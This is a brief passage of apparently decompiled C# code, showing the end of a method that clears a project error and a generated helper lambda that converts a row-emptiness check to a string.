				    ProjectData.ClearProjectError();
			    }
		    }
	    }

	    private string _Lambda__9(string a0)
	    {
		    return Conversions.ToString(this.RowIsEmpty(a0));
	    }
    }


}
